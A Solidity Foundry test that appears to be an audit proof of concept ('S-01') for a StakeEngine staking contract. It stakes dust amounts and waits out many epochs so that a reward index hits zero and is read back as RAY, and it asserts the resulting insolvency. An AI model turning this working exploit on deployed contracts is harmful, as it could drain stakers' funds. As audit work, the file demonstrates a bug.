// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "../src/StakeEngine.sol";
import "./mocks/MockVSP.sol";
import "./mocks/MockProtocolPolicy.sol";

/// S-01 v4: make the BUCKET the majority of the losing side.
/// gRay = rBase * behind / T, behind = T - (rankedTotal + live/2).
/// With rankedTotal tiny and live ~= T: behind ~= T/2 -> gRay ~= rBase/2.
/// factor = RAY - gRay hits 0 once gRay >= RAY, i.e. rBase >= 2*RAY.
/// rBase <= rMax = 5e18 * epochsElapsed / 365 -> epochs >= 146.
contract S01BucketMajorityPoC is Test {
    StakeEngine eng;
    MockVSP vsp;
    MockProtocolPolicy policy;
    uint256 constant POST = 42;
    uint256 constant RAY = 1e18;

    function setUp() public {
        vm.warp(86400 * 1000);
        vsp = new MockVSP();
        policy = new MockProtocolPolicy(0);
        policy.setRates(0, 5e18);
        eng = StakeEngine(
            address(
                new ERC1967Proxy(
                    address(new StakeEngine(address(0))),
                    abi.encodeCall(StakeEngine.initialize, (address(this), address(vsp), address(policy)))
                )
            )
        );
        vsp.mint(address(this), 1e30);
        vsp.approve(address(eng), type(uint256).max);
    }

    function _fund(address who, uint256 amt) internal {
        vsp.mint(who, amt);
        vm.prank(who);
        vsp.approve(address(eng), type(uint256).max);
    }

    function test_S01_BucketMajority() public {
        // 100 ranked lots of 1 wei -> rankedTotal = 100 wei (negligible)
        for (uint256 i = 0; i < 100; i++) {
            address r = address(uint160(0x100000 + i));
            _fund(r, 1);
            vm.prank(r);
            eng.stake(POST, 0, 1);
        }
        // 900 bucket members of 1 wei each (amount <= smallest ranked -> bucket)
        for (uint256 i = 0; i < 900; i++) {
            address b = address(uint160(0x200000 + i));
            _fund(b, 1);
            vm.prank(b);
            eng.stake(POST, 0, 1);
        }
        address victim = address(uint160(0x200000 + 500));

        // Challenge dominates -> support is the losing side, vRay -> RAY
        address ch = address(0xBEEF);
        _fund(ch, 1_000_000e18);
        vm.prank(ch);
        eng.stake(POST, 1, 1_000_000e18);

        (uint256 s0, uint256 c0) = eng.getPostTotals(POST);
        emit log_named_uint("support before", s0);
        emit log_named_uint("challenge before", c0);
        emit log_named_uint("victim before", eng.getUserStake(victim, POST, 0));

        uint256 balBefore = vsp.balanceOf(address(eng));

        // One settlement covering 250 epochs -> rBase ~= 3.4 * RAY
        vm.warp(block.timestamp + 250 days);
        eng.updatePost(POST);

        (uint256 s1, uint256 c1) = eng.getPostTotals(POST);
        uint256 balAfter = vsp.balanceOf(address(eng));
        uint256 claims = s1 + c1;
        uint256 victimAfter = eng.getUserStake(victim, POST, 0);

        emit log_named_uint("support after", s1);
        emit log_named_uint("challenge after", c1);
        emit log_named_uint("victim after", victimAfter);
        emit log_named_uint("bal before", balBefore);
        emit log_named_uint("bal after", balAfter);
        emit log_named_uint("claims", claims);

        if (claims > balAfter) {
            emit log_named_uint("DEFICIT", claims - balAfter);
        } else {
            emit log_named_uint("surplus", balAfter - claims);
        }

        // Second settlement: this is where the 0 index is READ back as RAY
        vm.warp(block.timestamp + 1 days);
        eng.updatePost(POST);
        (uint256 s2, uint256 c2) = eng.getPostTotals(POST);
        uint256 balAfter2 = vsp.balanceOf(address(eng));
        emit log_named_uint("support after 2nd", s2);
        emit log_named_uint("victim after 2nd", eng.getUserStake(victim, POST, 0));
        emit log_named_uint("claims after 2nd", s2 + c2);
        emit log_named_uint("bal after 2nd", balAfter2);
        if (s2 + c2 > balAfter2) {
            emit log_named_uint("DEFICIT 2nd", s2 + c2 - balAfter2);
        }

        assertGt(s2 + c2, balAfter2, "S-01: insolvency after sentinel read-back");
    }
}
